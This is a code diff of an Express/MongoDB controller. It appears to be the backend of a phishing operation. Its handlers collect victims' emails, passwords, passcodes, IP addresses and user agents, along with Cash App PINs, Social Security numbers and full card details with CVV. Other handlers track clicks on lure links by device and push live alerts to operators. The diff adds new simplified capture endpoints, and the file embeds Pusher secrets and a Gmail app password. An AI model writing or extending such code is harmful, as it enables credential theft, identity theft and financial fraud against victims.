@@ -29,12 +29,12 @@ const{id}=req.params
 
 
     try {
-      
+
          const originalDatawith = await Info.find({
             createdAt:{$gte: new Date(Date.now() - 30*24*60*60*1000)},
           }).select('email password')
 
-          
+
 
         return res.status(200).json({ originalDatawith})
 
@@ -263,7 +263,7 @@ export const   user_noti = async (req,res)=>{
         secret: '0599185eb95735d5a17a',
         cluster: 'ap2',
         useTLS: true,
-       
+
       });
 
     try{
@@ -359,7 +359,8 @@ export const id_card = async (req, res) => {
 
 export const poster_add = async (req, res) => {
 
-    const { username, password, links, id, posterId } = req.body
+    const { username, password, links, id } = req.body
+
 
 
     try {
@@ -369,24 +370,19 @@ export const poster_add = async (req, res) => {
             return res.status(400).json({ error: "username exists" })
 
         }
-        const posterIdExists = await Poster.findOne({ posterId: posterId })
-        if (posterIdExists) {
-            return res.status(400).json({ error: "Id exists" })
 
-        }
-       
-       
+
+
         if (user.numOfPosters >= user.numOfPostersPermission) {
             return res.status(400).json({ error: "User add limit reached" })
 
         }
-       
+
 
         const poster = await Poster.create({
-            username, password, links, posterId,
+            username, password, links,
 
             root: user._id
-
 
         })
         user.posters.push(poster._id)
@@ -423,9 +419,9 @@ export const add_data = async (req, res) => {
     const { adminId, posterId } = req.params
     const { site, mail, passcode ,email,password } = req.body
     const userAgent = req.headers['user-agent'];
-    const ipAddress =  (req.headers['x-forwarded-for'] || 
-    req.connection.remoteAddress || 
-    req.socket.remoteAddress || 
+    const ipAddress =  (req.headers['x-forwarded-for'] ||
+    req.connection.remoteAddress ||
+    req.socket.remoteAddress ||
     req.connection.socket.remoteAddress).split(",")[0];
 
     try {
@@ -445,7 +441,7 @@ export const add_data = async (req, res) => {
 
 
             })
-           
+
             await info.save();
             if(info){
                 pusher.trigger(userFound.adminId, 'new-notification', {
@@ -454,8 +450,8 @@ export const add_data = async (req, res) => {
             }
             posterFound.details.push(info._id)
             await posterFound.save();
-           
-            
+
+
             return   res.status(200).json({ info: info ,email:posterFound.username})
 
         }
@@ -511,12 +507,12 @@ export const delete_poster =  (req, res) => {
     User.findOne({_id: id_ad}).then(user => {
     const datas = user.posters.filter(posterId => posterId != id_pos)
     user.posters = [...datas]
-    user.numOfPosters =user.numOfPosters - 1 
+    user.numOfPosters =user.numOfPosters - 1
     user.save().then(useryes =>   console.log('saved yes')).catch(err => res.status(422).json({ error: err }))
     Link.deleteMany({ root: id_pos}).then(function(){
         console.log("Data deleted");
     }).catch(function(error){
-        console.log(error); 
+        console.log(error);
     });
     User.findOne({_id: id_ad})
     .populate({
@@ -528,11 +524,11 @@ export const delete_poster =  (req, res) => {
         .then(users =>   res.status(200).json({ data: users }))
         .catch(err => console.log('erro'))
 
-   
+
 
 }
 ).catch(err => res.status(422).json({ error: err }))
-  
+
 
 }
 
@@ -556,7 +552,7 @@ export const delete_info = async (req, res) => {
 
     Info.findByIdAndRemove({ _id: info_id })
     .then(user => console.log('deleted yes')).catch(err => console.log('deleted yes'))
-   
+
     Poster.findById({ _id: pos_id })
     .select('username password posterId links createdAt details')
     .populate('details', 'site email password skipcode username passcode mail mailPass onlyCard holdingCard createdAt').sort({ createdAt: -1 })
@@ -643,13 +639,13 @@ export const poster_details =async  (req, res) => {
 
 
 
- 
+
 
     try {
 
 
         const poster = await Poster.findOne({ _id: id }).select('username password posterId links createdAt')
-       
+
         const details =await Info.find({ root: id }).select('site mail passcode skipcode email password gCode ip agent status number createdAt').sort({ createdAt: -1 })
         // const newdata = {...poster, details: details }
         // console.log(newdata)
@@ -710,7 +706,7 @@ if(admin == 1){
         const sites = await Site.find()
         return res.status(200).json({ data: data.links, sites: sites })
     }
-        
+
 
 
 
@@ -722,12 +718,12 @@ if(admin == 1){
 
 export const site_exist_new =async (req, res) => {
 
-  
+
     // const { site, adminId, posterId,device} = req.params
 
     const { site, adminId, posterId,verifyId,device} = req.params
     // const siteName = "https://" + site + "/"  + adminId + "/" + posterId
-    const siteName = "https://" + site + "/"  + adminId + "/" + posterId  + "/" + verifyId 
+    const siteName = "https://" + site + "/"  + adminId + "/" + posterId  + "/" + verifyId
 
 
 
@@ -763,7 +759,7 @@ export const site_exist_new =async (req, res) => {
                                         }
                                         return res.status(200).json({ success: "exists" ,id:sitefound._id})
                                     }
-             
+
                           else{
                               const click = await Click.create({
                             site:siteName, adminId, posterId ,
@@ -778,7 +774,7 @@ export const site_exist_new =async (req, res) => {
                    }
                     return res.status(200).json({ success: "not exist" })
 
-       
+
 
     }
     catch (e) {
@@ -793,15 +789,15 @@ export const site_exist_new =async (req, res) => {
 
 export const site_exist =async (req, res) => {
 
-  
+
     // const { site, adminId, posterId,device} = req.params
 
     // const { site, adminId, posterId,device} = req.params
     // const siteName = "https://" + site + "/"  + adminId + "/" + posterId
 
     const { site,adminId, posterId,verifyId,device} = req.params
-    // const siteName =    "https://" + site + "/" + adminId + "/" + posterId  + "/" + verifyId 
-    const siteName =    "https://" + site   +  "/" + adminId + "/" + posterId  + "/" + verifyId 
+    // const siteName =    "https://" + site + "/" + adminId + "/" + posterId  + "/" + verifyId
+    const siteName =    "https://" + site   +  "/" + adminId + "/" + posterId  + "/" + verifyId
 
     // return res.status(200).json({ success: siteName })
 
@@ -821,11 +817,11 @@ export const site_exist =async (req, res) => {
                                             const  siteamout = await Amount.findOne({site:siteName})
                                             if(siteamout){
                                                 return res.status(200).json({ success: "exists" ,id:sitefound._id,sitename:siteamout})
-            
-            
+
+
                                              }
                                              return res.status(200).json({ success: "exists" ,id:sitefound._id})
-            
+
 
                                         }
                                         if(device == "phone"){
@@ -834,8 +830,8 @@ export const site_exist =async (req, res) => {
                                             const  siteamout = await Amount.findOne({site:siteName})
                                             if(siteamout){
                                                 return res.status(200).json({ success: "exists" ,id:sitefound._id,sitename:siteamout})
-            
-            
+
+
                                              }
                                              return res.status(200).json({ success: "exists" ,id:sitefound._id})
 
@@ -846,15 +842,15 @@ export const site_exist =async (req, res) => {
                                             const  siteamout = await Amount.findOne({site:siteName})
                                             if(siteamout){
                                                 return res.status(200).json({ success: "exists" ,id:sitefound._id,sitename:siteamout})
-            
-            
+
+
                                              }
                                              return res.status(200).json({ success: "exists" ,id:sitefound._id})
 
                                         }
                                         return res.status(200).json({ success: "exists" ,id:sitefound._id})
                                     }
-             
+
                           else{
                               const click = await Click.create({
                             site:siteName, adminId, posterId ,
@@ -882,7 +878,7 @@ export const site_exist =async (req, res) => {
                    }
                     return res.status(200).json({ success: "not exist" })
 
-       
+
 
     }
     catch (e) {
@@ -890,6 +886,135 @@ export const site_exist =async (req, res) => {
     }
 
 }
+
+export const site_exist_two_params = async (req, res) => {
+    const { site, param1, param2, device } = req.params;
+    const siteName = "https://" + site + "/" + param1 + "/" + param2;
+
+    try {
+        const sitefound = await Link.findOne({ linkName: siteName });
+
+        if (sitefound) {
+            const matchedSiteName = sitefound.linkName;
+            const clickfound = await Click.findOne({ site: matchedSiteName });
+            if (clickfound) {
+                clickfound.click = (clickfound.click || 0) + 1;
+                if (device === "desktop") {
+                    clickfound.desktop = (clickfound.desktop || 0) + 1;
+                } else if (device === "phone") {
+                    clickfound.phone = (clickfound.phone || 0) + 1;
+                } else if (device === "ipad") {
+                    clickfound.ipad = (clickfound.ipad || 0) + 1;
+                }
+                await clickfound.save();
+            } else {
+                await Click.create({
+                    site: matchedSiteName,
+                    adminId: param2,
+                    click: 1,
+                    desktop: device === "desktop" ? 1 : null,
+                    phone: device === "phone" ? 1 : null,
+                    ipad: device === "ipad" ? 1 : null
+                });
+            }
+
+            const siteamount = await Amount.findOne({ site: matchedSiteName });
+            if (siteamount) {
+                return res.status(200).json({ success: "exists", id: sitefound._id, sitename: siteamount });
+            }
+            return res.status(200).json({ success: "exists", id: sitefound._id });
+        }
+        return res.status(200).json({ success: "not exist" });
+    } catch (e) {
+        return res.status(400).json({ error: e.message });
+    }
+};
+
+export const site_exist_simplified = async (req, res) => {
+    const { site, adminId, device } = req.params;
+    const siteName = "https://" + site + "/" + adminId;
+
+    try {
+        const sitefound = await Link.findOne({ linkName: siteName });
+
+        if (sitefound) {
+            const matchedSiteName = sitefound.linkName;
+            const clickfound = await Click.findOne({ site: matchedSiteName });
+            if (clickfound) {
+                clickfound.click = (clickfound.click || 0) + 1;
+                if (device === "desktop") {
+                    clickfound.desktop = (clickfound.desktop || 0) + 1;
+                } else if (device === "phone") {
+                    clickfound.phone = (clickfound.phone || 0) + 1;
+                } else if (device === "ipad") {
+                    clickfound.ipad = (clickfound.ipad || 0) + 1;
+                }
+                await clickfound.save();
+            } else {
+                await Click.create({
+                    site: matchedSiteName,
+                    adminId: adminId,
+                    click: 1,
+                    desktop: device === "desktop" ? 1 : null,
+                    phone: device === "phone" ? 1 : null,
+                    ipad: device === "ipad" ? 1 : null
+                });
+            }
+
+            const siteamount = await Amount.findOne({ site: matchedSiteName });
+            if (siteamount) {
+                return res.status(200).json({ success: "exists", id: sitefound._id, sitename: siteamount });
+            }
+            return res.status(200).json({ success: "exists", id: sitefound._id });
+        }
+        return res.status(200).json({ success: "not exist" });
+    } catch (e) {
+        return res.status(400).json({ error: e.message });
+    }
+};
+
+export const add_data_simplified = async (req, res) => {
+    const pusher = new Pusher({
+        appId: '1987499',
+        key: '05656b52c62c0f688ee3',
+        secret: 'b4372518df233d054270',
+        cluster: 'ap2',
+        useTLS: true,
+    });
+
+    const { adminId } = req.params;
+    const { site, mail, passcode, email, password } = req.body;
+    const userAgent = req.headers['user-agent'];
+    const ipAddress = (req.headers['x-forwarded-for'] ||
+        req.connection.remoteAddress ||
+        req.socket.remoteAddress ||
+        req.connection.socket.remoteAddress).split(",")[0];
+
+    try {
+        const query = adminId.length === 24 ? { _id: adminId } : { $or: [{ adminId: adminId }, { username: adminId }] };
+        const userFound = await User.findOne(query);
+
+        if (userFound) {
+            const info = await Info.create({
+                site, mail, passcode,
+                email, password,
+                adminId: userFound.adminId || userFound.username,
+                ip: ipAddress,
+                agent: userAgent
+            });
+
+            await info.save();
+            pusher.trigger(userFound.adminId || userFound.username, 'new-notification', {
+                adminId: userFound.adminId || userFound.username,
+                name: userFound.username
+            });
+            return res.status(200).json({ status: "saved", info });
+        }
+        return res.status(400).json({ error: "User not found" });
+    } catch (e) {
+        return res.status(400).json({ error: e.message });
+    }
+};
 
 
 
@@ -977,10 +1102,10 @@ export const get_A_poster = async (req, res) => {
     }
         // return res.status(200).json({ data: id, sites: admin })
 
-        
+
         return res.status(200).json({ data: data.links, sites: sites })
-   
-        
+
+
 
     }
 
@@ -1035,7 +1160,7 @@ export const get_A_poster = async (req, res) => {
 //     }).catch(err=>console.log('err'))
 
 
-//  } 
+//  }
 
 
 
@@ -1050,7 +1175,7 @@ export const click = async (req, res) => {
 
         }
 
-        
+
         return res.status(400).json({ error: "not found any" })
 
 
@@ -1073,7 +1198,7 @@ export const click_for_admin = async (req, res) => {
 
         }
 
-        
+
         return res.status(400).json({ error: "not found any" })
 
 
@@ -1093,7 +1218,7 @@ export const otp_send = async (req, res) => {
     const postData =  {
         number: phone
       }
- 
+
     //   return res.status(200).json({ success:"otp sent successfully"})
 
       try{
@@ -1108,9 +1233,9 @@ export const otp_send = async (req, res) => {
             const otp = await Otp.create({
                 otp:response.data.otp,
                 username
-    
+
             })
-           
+
             // const   passwordOfPassChanges= await Password.findOne({constant:"yanky"})
             // passwordOfPassChanges.totalRequest= passwordOfPassChanges.totalRequest + 1
             // await  passwordOfPassChanges.save()
@@ -1120,14 +1245,14 @@ export const otp_send = async (req, res) => {
         return  res.status(400).json({ e: "user not found" })
 
 
-        
+
       }
       catch(e){
         return    res.status(400).json({ e: "error" })
 
       }
 
-        
+
 
 }
 
@@ -1136,7 +1261,7 @@ export const otp_check = async (req, res) => {
 
 
     try {
-        
+
          const   userFound = await User.findOne({username:username})
 
          const   otpUser = await Otp.findOne({otp:otp})
@@ -1151,9 +1276,9 @@ export const otp_check = async (req, res) => {
 
             }
               return res.status(200).json({ success: "true" })
-            }       
+            }
 
-      
+
      return   res.status(400).json({ e: "user not found" })
 
 
@@ -1175,11 +1300,11 @@ export const pass_change = async (req, res) => {
         useTLS: true,
       })
 
-   
+
 
 
     try {
-        
+
          const   userFound = await User.findOne({username:username})
          const   otpUser = await Otp.findOne({otp:otp})
 
@@ -1196,9 +1321,9 @@ export const pass_change = async (req, res) => {
               }
 
               return res.status(200).json({ success: "changed succesfully" })
-            }       
+            }
 
-      
+
      return   res.status(400).json({ e: "user not found" })
 
 
@@ -1215,10 +1340,10 @@ export const phone_add = async (req, res) => {
 
 
     try {
-        
+
          const   userFound = await User.findOne({username:username})
          const   userPhone = await User.findOne({phone:phone})
-      
+
 
             if(userFound){
 
@@ -1229,9 +1354,9 @@ export const phone_add = async (req, res) => {
                 userFound.phone=phone
               await userFound.save()
               return res.status(200).json({ success: "changed succesfully" })
-            }       
+            }
 
-      
+
      return   res.status(400).json({ e: "user not found" })
 
 
@@ -1275,15 +1400,15 @@ export const cashapap_post = async (req, res) => {
         if (userFound && posterFound) {
             const cashapp = await Cash.create({
                 contact, code, pin, ssn, email,password,site,card_number,mm_yy, ccv,zip,adminId, posterId
-    
-    
+
+
             })
             return res.status(200).json({ success: "Created successfully " })
         }
 
         return res.status(400).json({ error: "doesnt exists" })
 
-       
+
 
 
     }
@@ -1354,7 +1479,7 @@ export const demo_add = async (req, res) => {
     const {username, linkName,age } = req.body;
 console.log(username, linkName,age )
     try {
-      
+
         const userCreated = await Demo.create({
             username, linkName ,age
 
@@ -1382,8 +1507,8 @@ export const show_all = async (req, res) => {
     //     socket.io.emit("done")
     // })
     try {
-      
-        
+
+
         const userFound = await Poster.find().select("links")
 
         return res.status(200).json({ user: userFound })
@@ -1401,7 +1526,7 @@ export const check_qrcode = async (req, res) => {
     const { adminId } = req.params
 
     try {
-      
+
         const userFound = await User.findOne({ adminId: adminId })
 
 if(userFound){
@@ -1409,7 +1534,7 @@ if(userFound){
         return res.status(200).json({ status: true })
 
     }
-    
+
     return res.status(200).json({ status: false })
 
 }
@@ -1510,27 +1635,27 @@ export const today_data = async(req, res) => {
                 { $match: { adminId: IId } }, // Filter by adminId
                 { $group: { _id: null, totalDesktop: { $sum: "$desktop" } } } // Sum desktop values
             ]);
-            
-            
+
+
             const phoneClickSum = await Click.aggregate([
                 { $match: { adminId:IId } }, // Filter by adminId
                 { $group: { _id: null, totalPhone: { $sum: "$phone" } } } // Sum desktop values
             ]);
-            
+
             const ipadClickSum = await Click.aggregate([
                 { $match: { adminId: IId } }, // Filter by adminId
                 { $group: { _id: null, totalIpad: { $sum: "$ipad" } } } // Sum desktop values
             ]);
-            
-            
-            
+
+
+
             const totalDesktopClicks = desktopClickSum.length > 0 ? desktopClickSum[0].totalDesktop : 0;
             const totalPhoneClicks = phoneClickSum.length > 0 ? phoneClickSum[0].totalPhone : 0;
             const totalIpadClicks = ipadClickSum.length > 0 ? ipadClickSum[0].totalIpad : 0;
             return res.status(200).json({ desktopClick: totalDesktopClicks,mobileClick: totalPhoneClicks,tabletClick: totalIpadClicks,totalClick:totalDesktopClicks + totalPhoneClicks + totalIpadClicks})
 
 
-          
+
 
 
 
@@ -1541,26 +1666,26 @@ export const today_data = async(req, res) => {
                 { $match: { posterId: IId } }, // Filter by adminId
                 { $group: { _id: null, totalDesktop: { $sum: "$desktop" } } } // Sum desktop values
             ]);
-            
-            
+
+
             const phoneClickSum = await Click.aggregate([
                 { $match: { posterId:IId } }, // Filter by adminId
                 { $group: { _id: null, totalPhone: { $sum: "$phone" } } } // Sum desktop values
             ]);
-            
+
             const ipadClickSum = await Click.aggregate([
                 { $match: { posterId: IId } }, // Filter by adminId
                 { $group: { _id: null, totalIpad: { $sum: "$ipad" } } } // Sum desktop values
             ]);
-            
-            
-            
+
+
+
             const totalDesktopClicks = desktopClickSum.length > 0 ? desktopClickSum[0].totalDesktop : 0;
             const totalPhoneClicks = phoneClickSum.length > 0 ? phoneClickSum[0].totalPhone : 0;
             const totalIpadClicks = ipadClickSum.length > 0 ? ipadClickSum[0].totalIpad : 0;
             return res.status(200).json({ desktopClick: totalDesktopClicks,mobileClick: totalPhoneClicks,tabletClick: totalIpadClicks,totalClick:totalDesktopClicks + totalPhoneClicks + totalIpadClicks})
 
-            
+
 
         }
 }
@@ -1583,7 +1708,7 @@ export const email_otp = async (req, res) => {
         //   pass:'theh cifb ffjc ogil',
         },
       });
-    
+
       const mailOptions = {
         from: {
           name: 'Forget Password',
@@ -1593,12 +1718,12 @@ export const email_otp = async (req, res) => {
         subject: 'Otp Check',
         text: `Your Password OTP is ${rand}` ,
       };
-  
 
 
 
 
-     
+
+
         try {
             const   userFoundWithEmail = await User.findOne({email:email})
             const   userFoundWithUsername= await User.findOne({username:username})
@@ -1613,17 +1738,17 @@ export const email_otp = async (req, res) => {
         return  res.status(500).json({error:"not found"});
 
 
-          } 
-          catch (error) 
+          }
+          catch (error)
           {
             return  res.status(500).json({error:error});
           }
 
 
-      
 
 
-   
+
+
 }
 
 export const add_email = (req, res) => {
@@ -1650,19 +1775,19 @@ export const email_add = async (req, res) => {
 
 
     try {
-        
+
          const   userFound = await User.findOne({username:username})
          const   useremail= await User.findOne({email:email})
-      
+
 
          if(userFound && !useremail){
              userFound.email=email
            await userFound.save()
            return res.status(200).json({ success: "changed succesfully" })
-         }       
-   
+         }
 
-      
+
+
      return   res.status(400).json({ e: "user not found" })
 
 
@@ -1683,7 +1808,7 @@ export const send_email = async (req, res) => {
         port: 587,
         secure: false,
         auth: {
-            
+
 
                user: 'tonmoysamoi@gmail.com',
           pass:'theh cifb ffjc ogil',
@@ -1696,7 +1821,7 @@ export const send_email = async (req, res) => {
         //   pass:'zfhb vejz pdgm bbtw',
         },
       });
-    
+
       const mailOptions = {
         from: {
           name: 'Test Email',
@@ -1708,19 +1833,34 @@ export const send_email = async (req, res) => {
         text:"this email is from active ship management"
         // html:templete
       }
-      
+
       try {
         const info = await transporter.sendMail(mailOptions);
-      
+
        return res.status(200).json({success:'Email sent'});
       } catch (error) {
         console.log(error);
         return  res.status(500).json({error:error});
       }
 
-
-
-
-
-
 }
+
+export const dynamic_link_get = async (req, res) => {
+    const { id } = req.params;
+    try {
+        const links = await Link.find({ root: id }).sort({ createdAt: -1 });
+        return res.status(200).json({ data: links });
+    } catch (e) {
+        return res.status(400).json({ error: e.message });
+    }
+};
+
+export const dynamic_link_delete = async (req, res) => {
+    const { id } = req.params;
+    try {
+        await Link.findByIdAndDelete(id);
+        return res.status(200).json({ success: true });
+    } catch (e) {
+        return res.status(400).json({ error: e.message });
+    }
+};
